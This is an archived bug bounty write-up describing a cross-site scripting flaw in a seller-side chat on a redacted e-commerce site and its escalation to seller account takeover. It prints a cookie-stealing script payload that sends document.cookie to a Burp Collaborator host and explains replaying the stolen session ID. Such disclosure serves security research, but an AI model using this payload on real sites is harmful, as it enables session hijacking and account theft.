# XSS - Weaponization ATO

- **Source URL:** https://p4n7h3rx.medium.com/xss-weaponization-ato-1de0ee30526b?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20260714122418/https://p4n7h3rx.medium.com/xss-weaponization-ato-1de0ee30526b?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/4559 (id 4559)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# XSS — Weaponization ATO

Hi fellow hunters, In this write-up I will detail the discovery of a reflected cross-site scripting bug and the subsequent escalation that led to the takeover of seller accounts on the website.

The target under scrutiny is a private program an e-commerce website where both buyers and sellers are involved. For the sake of confidentiality, I will refer to this platform as [www.redacted.com](https://web.archive.org/web/20260714122418/http://www.redacted.com/) throughout this blog. Let’s delve into the process.

To initiate my exploration, I first created two accounts — one designated as a buyer and the other as a seller. Subsequently, I systematically examined the website, scrutinizing each input field. During this process, I identified a specific functionality that allows buyers to engage in chats with sellers. Without delay, I commenced sending blind XSS payloads to my seller’s account.

Unfortunately, there was no luck with the XSS; there was sanitization in place on the buyer’s end. After checking all the input fields with no success, I shifted my focus to testing the seller account.

Upon logging into the seller account and heading to the chat section where sellers receive messages from buyers, I found that the XSS vulnerability existed in the chat feature on the seller’s end. I then employed an XSS payload to escalate the situation and successfully took over the seller’s account.

One of the most impactful ways to maximize the effect of an XSS is by pilfering the victim’s session ID or token. This can lead to a complete account takeover, giving the attacker extensive control over the compromised account.

The payload I used for the account takeover involved sending the seller’s cookies to my Burp Collaborator. This allowed me to gain control over the seller’s account.

`<script>new Image().src="http://burp.collaborator/abc.php?output="+document.cookie;</script>`
After obtaining the Token, my initial step was to log in as an attacker. Utilizing Firefox’s inspect element feature, I replaced my session ID with the victim’s and refreshed the page. This action seamlessly logged me into the victim’s account, resulting in a successful session takeover.

**Final Note**

I genuinely appreciate your kind attention, and I extend my heartfelt gratitude. May your endeavors be blessed with abundant success in uncovering a multitude of bugs, each contributing to substantial rewards. Your dedication to this pursuit is truly commendable, and I wholeheartedly wish you the very best in your quest to identify and address these vulnerabilities.
